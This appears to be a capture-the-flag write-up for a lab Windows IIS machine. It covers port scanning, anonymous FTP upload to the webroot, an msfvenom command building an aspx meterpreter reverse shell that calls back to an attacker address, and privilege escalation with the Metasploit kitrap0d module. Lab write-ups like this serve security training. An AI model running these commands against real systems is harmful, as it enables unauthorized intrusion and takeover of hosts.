### Port Scanning and General Enumeration (Nmap)
* Reading/Resources
  * [Nmap manual](https://nmap.org/book/man.html)

Initial scan shows ports 21 (FTP) and 80 (HTTP) open.

The target scan shows us that **Anonymous FTP login** is allowed and it looks like the **webroot**.

Logging in to **FTP** with the creds **anonymous:anonymous** we can put a file and see if we can access it from the browser. I wrote a simple htm file that says `nice`.

### Access (FTP, metasploit, msfvenom)
* Reading/Resources
  * [FTP](https://linux.die.net/man/1/ftp)
  * [metasploit](https://github.com/security-cheatsheet/metasploit-cheat-sheet)
  * [msfvenom](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)

Things we know:
- We can access a file that we place on the FTP server
- We're working with **Microsoft IIS** so we'll probably need an **asp** or **aspx** file

Let's craft some shellcode using **msfvenom**

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f aspx > shell.aspx`

Set up a listener in **metasploit** and access our shell in the browser

`http://10.10.10.5/shell.aspx`

and...

### Privesc (metasploit, ms10-015)
* Reading/Resources
  * [metasploit](https://github.com/security-cheatsheet/metasploit-cheat-sheet)
  * [ms10-015](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-015)

Well, we're on the box but as a low priv account. Let's change that. Background the shell (**bg**) and:

`use post/multi/recon/local_exploit_suggester`

Looks like there's a few we can try. Let's try `kitrap0d`

`use exploit/windows/local/ms10_015_kitrap0d`

Make sure your settings are correct and fire it off.

That's a better account! Capture the flags
